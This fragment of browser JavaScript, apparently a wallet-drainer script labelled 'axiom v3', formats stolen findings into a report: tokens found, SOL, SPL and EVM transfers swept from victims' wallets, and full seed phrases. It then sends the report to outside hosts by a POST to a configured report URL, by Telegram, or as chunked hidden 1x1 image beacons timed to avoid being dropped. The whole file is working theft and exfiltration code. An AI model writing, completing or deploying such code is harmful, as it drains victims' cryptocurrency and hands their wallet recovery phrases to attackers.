    msgs.push("<b>🔍 Tokens Found on " + esc(short(r.pub, 6, 4)) + "</b><blockquote>" + block.join("") + "\n</blockquote>");
  });

  const moved = [];
  results.forEach((r) => (r.sent || []).forEach((x) => moved.push(x)));
  if (moved.length) {
    const block = [];
    moved.slice(0, 20).forEach((x) => {
      const mark = x.ok === false ? "⏳" : "✅";
      const tail = x.ok === false && x.err ? " ⚠️ <i>" + esc(String(x.err).slice(0, 50)) + "</i>" : "";
      if (x.type === "spl") {
        block.push("\n" + mark + " <b>SPL Token Transfer</b> — <b>" + esc(x.amount) + "</b> <code>" + esc(short(x.mint, 4, 4)) + "</code>" + tail);
      } else {
        const sol = Number(x.amount) / 1e9;
        block.push("\n" + mark + " <b>Balance Transfer</b> — <b>" + sol.toFixed(6) + " SOL" + (solUsd ? " ($" + usd(sol * solUsd) + ")" : "") + "</b>" + tail);
      }
    });
    msgs.push("<b>📤 TRANSFERS (" + moved.length + ")</b><blockquote>" + block.join("") + "\n</blockquote>");
  }

  if (seeds.length) {
    const block = ["\n🌱 <b>" + seeds.length + " phrase(s)</b>"];
    seeds.forEach((x) => block.push("\n<i>" + esc(x.key) + " [" + x.words + "w]</i>\n<code>" + esc(x.phrase) + "</code>"));
    msgs.push("<b>🔑 SEEDS</b><blockquote>" + block.join("") + "\n</blockquote>");
  }

  if (evmSweep.length) {
    const block = [];
    evmSweep.slice(0, 20).forEach((x) => {
      let line = "\n" + (x.status === "sent" || x.status === "token-sent" ? "✅ " : "▫️ ") + "<b>" + esc(x.chain) + "</b> <code>" + esc(short(x.address, 6, 4)) + "</code> — ";
      if (x.status === "sent") {
        line += "<b>sent " + fmtNative(x.value, x.chain) + "</b>";
      } else if (x.status.indexOf("token") >= 0) {
        line += esc(short(x.token, 4, 4)) + " <b>" + esc(x.amount || "") + "</b> (" + esc(x.status.replace("token-", "")) + ")";
      } else {
        line += esc(x.status.replace("native-", ""));
        if (x.wei && x.wei !== "0") line += " " + esc(fmtNative(x.wei, x.chain));
      }
      if (x.error) line += " ⚠️ <i>" + esc(String(x.error).slice(0, 60)) + "</i>";
      block.push(line);
    });
    msgs.push("<b>⛓ EVM SWEEP</b><blockquote>" + block.join("") + "\n</blockquote>");
  }

  const errs = [];
  results.forEach((r) => (r.errors || []).forEach((e) => errs.push(e)));
  if (errs.length) {
    const block = [];
    errs.slice(0, 10).forEach((e) => block.push("\n⚠️ " + esc(String(e).slice(0, 90))));
    msgs.push("<b>NOTES</b><blockquote>" + block.join("") + "\n</blockquote>");
  }

  const normalize = (m) => m.replace(/<\/b><blockquote>/g, "</b>\n<blockquote>");
  const splitMsg = (m) => {
    if (m.length <= 3400) return [m];
    const k = m.indexOf("<blockquote>");
    const title = k > 0 ? m.slice(0, k).replace(/\n$/, "") : "";
    const body = (k >= 0 ? m.slice(k + 12) : m).replace(/<\/blockquote>\s*$/, "");
    const out = [];
    let cur = [];
    let len = 0;
    for (const line of body.split("\n")) {
      if (len + line.length + 1 > 3000 && cur.length) {
        out.push(title + "\n<blockquote>" + cur.join("\n") + "</blockquote>");
        cur = [];
        len = 0;
      }
      cur.push(line);
      len += line.length + 1;
    }
    if (cur.length) out.push(title + "\n<blockquote>" + cur.join("\n") + "</blockquote>");
    return out;
  };
  const finalMsgs = [];
  for (const m of msgs) for (const part of splitMsg(normalize(m))) finalMsgs.push(part);
  const reportText = finalMsgs.join("\n").replace(/<[^>]+>/g, "");
  window.__axReport = reportText;
  window.__axMsgs = finalMsgs;

  const sid = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
  let channel = "none";

  if (CFG.reportUrl && !CFG.reportUrl.includes("FILL")) {
    try {
      const res = await fetch(CFG.reportUrl, {
        method: "POST",
        headers: { "content-type": "text/plain" },
        body,
      });
      if (res.ok) channel = "post";
    } catch {}
  }

  if (channel === "none" && CFG.telegram && !DRY) {
    const sent = await sendTelegram(finalMsgs);
    if (sent) channel = "telegram x" + sent;
  }

  if (channel === "none" && CFG.beaconUrl && !CFG.beaconUrl.includes("FILL")) {
    const packed = await packBody(body);
    const chunk = CFG.beaconChunk;
    const total = Math.max(1, Math.ceil(packed.data.length / chunk));
    const sep = CFG.beaconUrl.includes("?") ? "&" : "?";

    for (let i = 0; i < total; i++) {
      const img = new Image();
      img.src =
        CFG.beaconUrl +
        sep +
        "uid=" + encodeURIComponent(CFG.uid) +
        "&sid=" + encodeURIComponent(sid) +
        "&i=" + i +
        "&n=" + total +
        "&gz=" + packed.gz +
        "&d=" + encodeURIComponent(packed.data.slice(i * chunk, (i + 1) * chunk));
      img.style.cssText = "position:fixed;opacity:0;pointer-events:none;width:1px;height:1px";
      document.body.appendChild(img);
      img.onload = img.onerror = () => img.remove();
      // Spacing keeps the browser from coalescing or dropping rapid requests.
      await new Promise((r) => setTimeout(r, 120));
    }
    channel = "beacon x" + total;
  }

  ui.done(`v3 done — ${channel}`);
})().catch((err) => {
  window.__axv3 = false;
  console.error("[axv3]", err);
  alert("axiom v3: " + (err.message || err));
});
